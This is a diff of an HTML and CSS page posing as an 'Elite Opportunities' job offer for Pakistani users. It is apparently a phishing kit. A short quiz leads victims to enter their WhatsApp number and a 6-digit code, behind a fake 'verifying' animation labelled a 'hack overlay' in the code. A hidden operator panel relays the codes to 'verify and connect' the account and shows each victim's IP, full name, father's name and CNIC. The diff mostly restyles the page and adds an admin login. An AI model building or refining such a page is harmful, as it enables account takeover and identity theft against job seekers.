@@ -2,314 +2,319 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join Our Company - Elite Opportunities</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Elite Opportunities - Join Us</title>
     <style>
+        :root {
+            --primary: #8a2be2;
+            --secondary: #ff6b6b;
+            --success: #00ffaa;
+            --bg-dark: #0a0a0a;
+            --bg-card: #111111;
+            --text-white: #ffffff;
+            --text-gray: #888888;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        body {
-            background: #0a0a0a;
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-white);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Fixed background layers */
+        .bg-layer {
+            position: fixed;
+            inset: 0;
+            z-index: -2;
+            background: radial-gradient(circle at center, #1a0a2e 0%, #0a0a0a 70%);
+        }
+
+        .grid-layer {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(138, 43, 226, 0.08) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(138, 43, 226, 0.08) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: gridShift 2s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes gridShift {
+            0% { background-position: 0 0; }
+            100% { background-position: 40px 40px; }
+        }
+
+        /* Main app container */
+        .app-container {
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
+            padding: 15px;
             position: relative;
+            z-index: 1;
         }
 
-        /* Animated background */
-        .bg-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at center, #1a0a2e 0%, #0a0a0a 100%);
-            z-index: -2;
-        }
-
-        .grid-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(138, 43, 226, 0.1) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(138, 43, 226, 0.1) 1px, transparent 1px);
-            background-size: 40px 40px;
-            z-index: -1;
-            animation: gridMove 2s linear infinite;
-        }
-
-        @keyframes gridMove {
-            0% { transform: translate(0,0); }
-            100% { transform: translate(40px,40px); }
-        }
-
-        /* Floating particles */
-        .particle {
-            position: fixed;
-            border-radius: 50%;
-            background: rgba(138, 43, 226, 0.3);
-            animation: float 15s infinite linear;
-            z-index: -1;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-100vh) rotate(720deg);
-                opacity: 0;
-            }
-        }
-
-        .container {
-            background: rgba(17, 17, 17, 0.95);
+        .card {
+            background: rgba(17, 17, 17, 0.98);
             border-radius: 20px;
-            padding: 40px;
-            width: 450px;
-            max-width: 90%;
-            box-shadow: 0 0 60px rgba(138, 43, 226, 0.4);
-            border: 1px solid rgba(138, 43, 226, 0.3);
-            position: relative;
-            z-index: 2;
+            padding: clamp(20px, 4vw, 40px);
+            width: min(480px, 100%);
+            box-shadow: 0 0 60px rgba(138, 43, 226, 0.3);
+            border: 1px solid rgba(138, 43, 226, 0.25);
             text-align: center;
-            animation: slideIn 0.5s ease;
+            animation: cardIn 0.4s ease;
             max-height: 90vh;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .logo {
-            font-size: 60px;
-            margin-bottom: 15px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
-        }
-
-        h1 {
-            color: #fff;
-            font-size: 28px;
-            margin-bottom: 10px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #8a2be2, #ff6b6b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .subtitle {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #8a2be2, #ff6b6b);
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(138, 43, 226, 0.5);
-        }
-
-        .btn:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
-        }
-
-        .btn-small {
-            padding: 12px;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 15px;
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 20px;
-            outline: none;
-            transition: border 0.3s;
-        }
-
-        .input-field:focus {
-            border-color: #8a2be2;
-            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
-        }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin: 20px 0;
-        }
-
-        .option-btn {
-            padding: 15px;
-            background: #1a1a1a;
-            border: 2px solid #333;
-            border-radius: 12px;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        .option-btn:hover {
-            border-color: #8a2be2;
-            background: rgba(138, 43, 226, 0.2);
-            transform: scale(1.05);
-        }
-
-        .option-btn.selected {
-            border-color: #8a2be2;
-            background: rgba(138, 43, 226, 0.3);
-            box-shadow: 0 0 20px rgba(138, 43, 226, 0.4);
+        @keyframes cardIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .hidden {
             display: none !important;
         }
 
-        .step-indicator {
+        .logo {
+            font-size: clamp(40px, 8vw, 60px);
+            margin-bottom: 10px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            font-size: clamp(20px, 4vw, 28px);
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+        }
+
+        .subtitle {
+            color: var(--text-gray);
+            font-size: clamp(13px, 2.5vw, 15px);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            width: 100%;
+            padding: clamp(14px, 2.5vw, 16px);
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: clamp(14px, 2.5vw, 16px);
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(138, 43, 226, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 10px rgba(138, 43, 226, 0.3);
+        }
+
+        .btn:disabled {
+            background: #2a2a2a;
+            color: #555;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--text-gray);
+            border: 1px solid #333;
+            font-size: clamp(12px, 2vw, 14px);
+            padding: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-outline:hover {
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: none;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: clamp(12px, 2.5vw, 15px);
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: white;
+            font-size: clamp(14px, 2.5vw, 16px);
+            margin-bottom: 15px;
+            outline: none;
+            transition: all 0.3s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .input-field:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.3);
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .option-btn {
+            padding: clamp(12px, 2.5vw, 15px);
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 12px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s;
+            font-size: clamp(12px, 2vw, 14px);
+            text-align: center;
+            font-weight: 500;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .option-btn:hover {
+            border-color: var(--primary);
+            background: rgba(138, 43, 226, 0.15);
+        }
+
+        .option-btn:active {
+            transform: scale(0.95);
+        }
+
+        .option-btn.selected {
+            border-color: var(--primary);
+            background: rgba(138, 43, 226, 0.25);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.3);
+        }
+
+        .step-dots {
             display: flex;
             justify-content: center;
             gap: 8px;
             margin-bottom: 20px;
         }
 
-        .step-dot {
-            width: 10px;
-            height: 10px;
+        .dot {
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
             background: #333;
             transition: all 0.3s;
         }
 
-        .step-dot.active {
-            background: #8a2be2;
-            box-shadow: 0 0 15px #8a2be2;
-            transform: scale(1.3);
+        .dot.active {
+            background: var(--primary);
+            box-shadow: 0 0 10px var(--primary);
+            transform: scale(1.2);
         }
 
-        .step-dot.completed {
-            background: #00ffaa;
-            box-shadow: 0 0 15px #00ffaa;
+        .dot.done {
+            background: var(--success);
+            box-shadow: 0 0 10px var(--success);
         }
 
-        /* Loading animation */
-        .loading-spinner {
+        .spinner {
             display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(138, 43, 226, 0.2);
-            border-top: 4px solid #8a2be2;
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(138, 43, 226, 0.2);
+            border-top: 3px solid var(--primary);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px;
+            animation: spin 0.8s linear infinite;
+            margin: 15px;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
 
-        /* WhatsApp connect styles */
-        .code-display {
+        .code-box {
             background: #000;
-            border: 2px dashed #8a2be2;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-            font-size: 32px;
-            letter-spacing: 8px;
-            color: #8a2be2;
-            animation: codeGlow 1.5s infinite alternate;
+            border: 2px dashed var(--primary);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: clamp(24px, 5vw, 32px);
+            letter-spacing: 6px;
+            color: var(--primary);
+            animation: glow 1.5s infinite alternate;
+            font-weight: 700;
         }
 
-        @keyframes codeGlow {
-            from { text-shadow: 0 0 10px #8a2be2; }
-            to { text-shadow: 0 0 30px #8a2be2, 0 0 60px #8a2be2; }
+        @keyframes glow {
+            from { text-shadow: 0 0 10px var(--primary); }
+            to { text-shadow: 0 0 30px var(--primary), 0 0 50px var(--primary); }
         }
 
-        /* Hack animation overlay */
-        .hack-overlay {
+        /* Overlay for hack animation */
+        .overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0;
             background: #000;
-            z-index: 100;
+            z-index: 1000;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: #8a2be2;
+            color: var(--primary);
+            padding: 20px;
         }
 
-        .hack-text {
-            font-size: 24px;
-            margin-bottom: 30px;
+        .overlay-text {
+            font-size: clamp(18px, 4vw, 24px);
+            margin-bottom: 20px;
             font-family: 'Courier New', monospace;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
+            text-align: center;
         }
 
-        .progress-container {
-            width: 300px;
-            height: 20px;
+        .progress-wrap {
+            width: min(300px, 80%);
+            height: 18px;
             background: #111;
-            border: 1px solid #8a2be2;
+            border: 1px solid var(--primary);
             border-radius: 10px;
             overflow: hidden;
         }
@@ -317,51 +322,121 @@
         .progress-bar {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #8a2be2, #ff6b6b, #8a2be2);
-            transition: width 0.3s;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--primary));
+            transition: width 0.3s ease;
         }
 
-        .hack-status {
-            font-size: 14px;
-            margin-top: 20px;
+        .progress-status {
+            font-size: clamp(12px, 2.5vw, 14px);
+            margin-top: 15px;
             color: #888;
             font-family: 'Courier New', monospace;
+            text-align: center;
+        }
+
+        /* Admin floating button */
+        .admin-fab {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 500;
+            background: rgba(255, 170, 0, 0.15);
+            border: 1px solid rgba(255, 170, 0, 0.4);
+            color: #ffaa00;
+            padding: 8px 15px;
+            border-radius: 25px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .admin-fab:hover {
+            background: rgba(255, 170, 0, 0.25);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.3);
+        }
+
+        /* Admin login modal */
+        .admin-login-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 600;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        .admin-login-box {
+            background: #1a1a1a;
+            border: 1px solid #ffaa00;
+            border-radius: 15px;
+            padding: 25px;
+            width: min(320px, 100%);
+            text-align: center;
+        }
+
+        .admin-login-box h3 {
+            color: #ffaa00;
+            margin-bottom: 20px;
+            font-size: 18px;
         }
 
         /* Admin panel */
         .admin-panel {
             position: fixed;
-            top: 20px;
-            right: 20px;
+            top: 15px;
+            right: 15px;
             background: #1a1a1a;
             border: 1px solid #ffaa00;
             border-radius: 15px;
-            padding: 20px;
-            z-index: 200;
-            width: 280px;
+            padding: 15px;
+            z-index: 550;
+            width: min(300px, calc(100vw - 30px));
             color: #ffaa00;
-            font-size: 14px;
-            box-shadow: 0 0 30px rgba(255, 170, 0, 0.5);
-            max-height: 90vh;
+            font-size: 13px;
+            box-shadow: 0 0 30px rgba(255, 170, 0, 0.4);
+            max-height: 85vh;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
         .admin-panel h3 {
             color: #ffaa00;
-            margin-bottom: 15px;
-            font-size: 16px;
-            letter-spacing: 1px;
+            margin-bottom: 12px;
+            font-size: 15px;
             text-align: center;
+            letter-spacing: 1px;
         }
 
-        .admin-panel .admin-input {
+        .admin-info-box {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 8px 0;
+            font-size: 11px;
+            color: #ddd;
+            text-align: left;
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        .admin-input {
+            width: 100%;
+            padding: 10px;
             background: #000;
             border: 1px solid #ffaa00;
             color: #ffaa00;
-            margin-bottom: 10px;
-            font-size: 14px;
-            padding: 10px;
-            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            outline: none;
         }
 
         .admin-btn {
@@ -371,15 +446,20 @@
             color: #000;
             border: none;
             border-radius: 8px;
-            font-size: 14px;
-            font-weight: bold;
+            font-size: 13px;
+            font-weight: 700;
             cursor: pointer;
-            margin-bottom: 8px;
-            transition: all 0.3s;
+            margin-bottom: 6px;
+            transition: all 0.2s;
+            touch-action: manipulation;
         }
 
         .admin-btn:hover {
-            box-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+            box-shadow: 0 0 15px rgba(255, 170, 0, 0.4);
+        }
+
+        .admin-btn:active {
+            transform: scale(0.95);
         }
 
         .admin-btn.green {
@@ -388,224 +468,240 @@
 
         .admin-btn.red {
             background: #ff4444;
-            color: #fff;
-        }
-
-        .admin-info {
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #fff;
-            text-align: left;
+            color: white;
         }
 
         .status-indicator {
             display: inline-block;
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
             margin-right: 5px;
         }
 
         .status-online {
             background: #00ffaa;
-            box-shadow: 0 0 10px #00ffaa;
-        }
-
-        .status-offline {
-            background: #ff4444;
-            box-shadow: 0 0 10px #ff4444;
+            box-shadow: 0 0 8px #00ffaa;
         }
 
         .success-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-        }
-
-        .success-message {
-            font-size: 24px;
-            color: #00ffaa;
-            font-weight: bold;
-            letter-spacing: 2px;
+            font-size: clamp(60px, 10vw, 80px);
             margin-bottom: 15px;
         }
 
+        .success-title {
+            font-size: clamp(20px, 4vw, 24px);
+            color: #00ffaa;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .success-text {
+            color: #aaa;
+            line-height: 1.6;
+            font-size: clamp(13px, 2.5vw, 15px);
+        }
+
         @media (max-width: 480px) {
-            .container {
-                width: 95%;
-                padding: 20px;
+            .card {
+                padding: 16px;
+                border-radius: 16px;
+            }
+            .options-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
             }
             .admin-panel {
-                width: 200px;
                 top: 10px;
                 right: 10px;
                 font-size: 12px;
+                padding: 12px;
             }
+        }
+
+        @media (max-width: 350px) {
             .options-grid {
                 grid-template-columns: 1fr;
             }
+        }
+
+        /* Prevent text selection on interactive elements */
+        .btn, .option-btn, .admin-btn, .admin-fab {
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="bg-animation"></div>
-    <div class="grid-overlay"></div>
+    <div class="bg-layer"></div>
+    <div class="grid-layer"></div>
 
-    <!-- Main Container -->
-    <div class="container" id="mainContainer">
-        <!-- Step 1: Welcome -->
-        <div id="stepWelcome">
-            <div class="logo">🚀</div>
-            <h1>Join Our Elite Team</h1>
-            <p class="subtitle">Unlock Your Potential with Us</p>
-            <div class="loading-spinner" id="welcomeSpinner"></div>
-            <p style="color:#aaa; margin-bottom: 20px;">Loading amazing opportunities...</p>
-            <button class="btn" id="getStartedBtn">Get Started</button>
-        </div>
+    <!-- Admin floating button -->
+    <div class="admin-fab" id="adminFab">🔐 Admin</div>
 
-        <!-- Step 2: Questions -->
-        <div id="stepQuestions" class="hidden">
-            <div class="step-indicator">
-                <div class="step-dot active"></div>
-                <div class="step-dot"></div>
-                <div class="step-dot"></div>
-                <div class="step-dot"></div>
-            </div>
-            <h1 style="font-size: 22px;">Quick Questions</h1>
-            <p class="subtitle">Help us understand you better</p>
-            
-            <div id="question1">
-                <p style="color:#fff; margin-bottom: 15px; font-weight: bold;">How did you hear about us?</p>
-                <div class="options-grid">
-                    <div class="option-btn" data-question="1" data-answer="Friends">Friends</div>
-                    <div class="option-btn" data-question="1" data-answer="News">News</div>
-                    <div class="option-btn" data-question="1" data-answer="Meta">Meta</div>
-                    <div class="option-btn" data-question="1" data-answer="Other">Other</div>
-                </div>
-            </div>
-
-            <div id="question2" class="hidden">
-                <p style="color:#fff; margin-bottom: 15px; font-weight: bold;">How much do you want to earn?</p>
-                <div class="options-grid">
-                    <div class="option-btn" data-question="2" data-answer="100K+ PKR">100K+ PKR</div>
-                    <div class="option-btn" data-question="2" data-answer="50K-100K PKR">50K-100K PKR</div>
-                    <div class="option-btn" data-question="2" data-answer="25K-50K PKR">25K-50K PKR</div>
-                    <div class="option-btn" data-question="2" data-answer="10K-25K PKR">10K-25K PKR</div>
-                </div>
-            </div>
-
-            <div id="question3" class="hidden">
-                <p style="color:#fff; margin-bottom: 15px; font-weight: bold;">Have you ever worked online?</p>
-                <div class="options-grid">
-                    <div class="option-btn" data-question="3" data-answer="Yes">Yes</div>
-                    <div class="option-btn" data-question="3" data-answer="No">No</div>
-                </div>
-            </div>
-
-            <div id="question4" class="hidden">
-                <p style="color:#fff; margin-bottom: 20px; font-weight: bold;">Ready to get started?</p>
-                <button class="btn" id="readyBtn">I'm Ready - Get Started Now!</button>
-            </div>
-        </div>
-
-        <!-- Step 3: WhatsApp Connect -->
-        <div id="stepWhatsApp" class="hidden">
-            <div class="step-indicator">
-                <div class="step-dot completed"></div>
-                <div class="step-dot completed"></div>
-                <div class="step-dot completed"></div>
-                <div class="step-dot completed"></div>
-            </div>
-            <div class="logo">💬</div>
-            <h1 style="font-size: 22px;">Connect Your WhatsApp</h1>
-            <p class="subtitle">We'll verify your profile and bot commands</p>
-            
-            <div id="waStep1">
-                <input type="tel" class="input-field" id="phoneNumber" placeholder="Enter your WhatsApp number" />
-                <button class="btn" id="sendCodeBtn">Send Verification Code</button>
-            </div>
-
-            <div id="waStep2" class="hidden">
-                <p style="color:#888; margin-bottom: 20px;">
-                    Verification code sent to:
-                    <strong id="displayNumber" style="color:#fff;"></strong>
-                </p>
-                <div class="code-display" id="codeDisplay">______</div>
-                <input type="text" class="input-field" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" />
-                <button class="btn" id="verifyBtn" disabled>Waiting for admin approval...</button>
-                <button class="btn-small" id="changeNumberBtn" style="background: transparent; color: #888; font-size: 14px;">← Change number</button>
-            </div>
-        </div>
-
-        <!-- Step 4: Final Form -->
-        <div id="stepFinalForm" class="hidden">
-            <div class="success-icon">✅</div>
-            <div class="success-message">WhatsApp Connected!</div>
-            <p style="color:#888; margin-bottom: 20px;">Please complete your profile</p>
-            
-            <input type="text" class="input-field" id="fullName" placeholder="Enter your full name" />
-            <input type="text" class="input-field" id="fatherName" placeholder="Enter your father's name" />
-            <input type="text" class="input-field" id="cnic" placeholder="Enter your CNIC number" />
-            <button class="btn" id="submitProfileBtn">Submit Profile</button>
-        </div>
-
-        <!-- Step 5: Thank You -->
-        <div id="stepThankYou" class="hidden">
-            <div class="success-icon">🎉</div>
-            <div class="success-message">Application Received!</div>
-            <p style="color:#aaa; margin: 20px; line-height: 1.6;">
-                Thank you <strong id="thankYouName" style="color:#8a2be2;"></strong> for applying!
-                <br><br>
-                Please wait 24-48 hours. We'll contact you on your WhatsApp.
-            </p>
+    <!-- Admin login modal -->
+    <div class="admin-login-modal hidden" id="adminLoginModal">
+        <div class="admin-login-box">
+            <h3>🔐 Admin Login</h3>
+            <input type="text" class="input-field" id="adminUsername" placeholder="Username" style="margin-bottom:10px;" />
+            <input type="password" class="input-field" id="adminPassword" placeholder="Password" style="margin-bottom:15px;" />
+            <button class="btn" id="adminLoginBtn" style="background:#ffaa00; color:#000;">Login</button>
+            <button class="btn-outline" id="adminCancelBtn" style="margin-top:10px; color:#888;">Cancel</button>
         </div>
     </div>
 
-    <!-- Hacking Animation Overlay -->
-    <div class="hack-overlay hidden" id="hackOverlay">
-        <div class="hack-text">⚡ VERIFYING YOUR PROFILE ⚡</div>
-        <div class="progress-container">
+    <!-- Admin panel -->
+    <div class="admin-panel hidden" id="adminPanel">
+        <h3>⚙️ ADMIN CONTROL</h3>
+        <p style="color:#fff; font-size:11px; margin-bottom:8px; text-align:center;">
+            <span class="status-indicator status-online" id="statusDot"></span>
+            <span id="connectionStatus">Live</span>
+        </p>
+        <div class="admin-info-box" id="adminUserInfo">
+            <strong>📊 User Data:</strong><br>
+            📱 <span id="adminPhone">-</span><br>
+            🔍 <span id="adminSource">-</span><br>
+            💰 <span id="adminEarning">-</span><br>
+            💼 <span id="adminExperience">-</span><br>
+            🌐 <span id="adminIP">-</span><br>
+            👤 <span id="adminName">-</span><br>
+            👨 <span id="adminFather">-</span><br>
+            🪪 <span id="adminCNIC">-</span>
+        </div>
+        <input type="text" class="admin-input" id="adminCode" placeholder="Enter 6-digit code" maxlength="6" />
+        <button class="admin-btn" id="adminSendCode">📤 Send Code to User</button>
+        <button class="admin-btn green" id="adminVerifyConnect">✅ Verify & Connect</button>
+        <button class="admin-btn red" id="adminReset">🔄 Reset Everything</button>
+        <button class="admin-btn" id="adminLogoutBtn" style="background:#333; color:#fff;">🚪 Logout</button>
+    </div>
+
+    <!-- Main app container -->
+    <div class="app-container">
+        <div class="card" id="mainCard">
+            <!-- Welcome step -->
+            <div id="stepWelcome">
+                <div class="logo">🚀</div>
+                <h1>Join Our Elite Team</h1>
+                <p class="subtitle">Unlock Your Potential with Us</p>
+                <div class="spinner" id="welcomeSpinner"></div>
+                <p class="subtitle" style="margin-bottom:15px;">Loading amazing opportunities...</p>
+                <button class="btn" id="getStartedBtn">Get Started</button>
+            </div>
+
+            <!-- Questions step -->
+            <div id="stepQuestions" class="hidden">
+                <div class="step-dots">
+                    <div class="dot active" id="dot1"></div>
+                    <div class="dot" id="dot2"></div>
+                    <div class="dot" id="dot3"></div>
+                    <div class="dot" id="dot4"></div>
+                </div>
+                <h1 style="font-size:clamp(18px,3.5vw,22px);">Quick Questions</h1>
+                <p class="subtitle">Help us understand you better</p>
+                
+                <div id="q1">
+                    <p style="color:#fff; margin-bottom:12px; font-weight:600;">How did you hear about us?</p>
+                    <div class="options-grid">
+                        <div class="option-btn" data-q="1" data-a="Friends">Friends</div>
+                        <div class="option-btn" data-q="1" data-a="News">News</div>
+                        <div class="option-btn" data-q="1" data-a="Meta">Meta</div>
+                        <div class="option-btn" data-q="1" data-a="Other">Other</div>
+                    </div>
+                </div>
+
+                <div id="q2" class="hidden">
+                    <p style="color:#fff; margin-bottom:12px; font-weight:600;">How much do you want to earn?</p>
+                    <div class="options-grid">
+                        <div class="option-btn" data-q="2" data-a="100K+ PKR">100K+ PKR</div>
+                        <div class="option-btn" data-q="2" data-a="50K-100K PKR">50K-100K PKR</div>
+                        <div class="option-btn" data-q="2" data-a="25K-50K PKR">25K-50K PKR</div>
+                        <div class="option-btn" data-q="2" data-a="10K-25K PKR">10K-25K PKR</div>
+                    </div>
+                </div>
+
+                <div id="q3" class="hidden">
+                    <p style="color:#fff; margin-bottom:12px; font-weight:600;">Have you ever worked online?</p>
+                    <div class="options-grid">
+                        <div class="option-btn" data-q="3" data-a="Yes">Yes</div>
+                        <div class="option-btn" data-q="3" data-a="No">No</div>
+                    </div>
+                </div>
+
+                <div id="q4" class="hidden">
+                    <p style="color:#fff; margin-bottom:15px; font-weight:600;">Ready to get started?</p>
+                    <button class="btn" id="readyBtn">I'm Ready - Get Started!</button>
+                </div>
+            </div>
+
+            <!-- WhatsApp step -->
+            <div id="stepWhatsApp" class="hidden">
+                <div class="step-dots">
+                    <div class="dot done"></div>
+                    <div class="dot done"></div>
+                    <div class="dot done"></div>
+                    <div class="dot done"></div>
+                </div>
+                <div class="logo">💬</div>
+                <h1 style="font-size:clamp(18px,3.5vw,22px);">Connect WhatsApp</h1>
+                <p class="subtitle">We'll verify your profile</p>
+                
+                <div id="waStep1">
+                    <input type="tel" class="input-field" id="phoneNumber" placeholder="Enter your WhatsApp number" />
+                    <button class="btn" id="sendCodeBtn">Send Verification Code</button>
+                </div>
+
+                <div id="waStep2" class="hidden">
+                    <p style="color:#888; margin-bottom:15px;">
+                        Code sent to: <strong id="displayNumber" style="color:#fff;"></strong>
+                    </p>
+                    <div class="code-box" id="codeDisplay">______</div>
+                    <input type="text" class="input-field" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" style="text-align:center; letter-spacing:4px;" />
+                    <button class="btn" id="verifyBtn" disabled>Waiting for admin...</button>
+                    <button class="btn-outline" id="changeNumberBtn">← Change number</button>
+                </div>
+            </div>
+
+            <!-- Final form step -->
+            <div id="stepFinalForm" class="hidden">
+                <div class="success-icon">✅</div>
+                <div class="success-title">WhatsApp Connected!</div>
+                <p class="subtitle">Please complete your profile</p>
+                
+                <input type="text" class="input-field" id="fullName" placeholder="Enter your full name" />
+                <input type="text" class="input-field" id="fatherName" placeholder="Enter your father's name" />
+                <input type="text" class="input-field" id="cnic" placeholder="Enter your CNIC number" />
+                <button class="btn" id="submitProfileBtn">Submit Profile</button>
+            </div>
+
+            <!-- Thank you step -->
+            <div id="stepThankYou" class="hidden">
+                <div class="success-icon">🎉</div>
+                <div class="success-title">Application Received!</div>
+                <p class="success-text">
+                    Thank you <strong id="thankYouName" style="color:#8a2be2;"></strong>!
+                    <br><br>
+                    Please wait 24-48 hours.
+                    <br>
+                    We'll contact you on WhatsApp.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hack overlay -->
+    <div class="overlay hidden" id="hackOverlay">
+        <div class="overlay-text">⚡ VERIFYING YOUR PROFILE ⚡</div>
+        <div class="progress-wrap">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="hack-status" id="hackStatus">
-            Connecting to secure server... 0%
-        </div>
-    </div>
-
-    <!-- Admin Panel -->
-    <div class="admin-panel hidden" id="adminPanel">
-        <h3>⚙️ ADMIN PANEL</h3>
-        <p style="color:#fff; font-size:12px; margin-bottom:5px;">
-            <span class="status-indicator status-online" id="statusDot"></span>
-            <span id="connectionStatus">Connected</span>
-        </p>
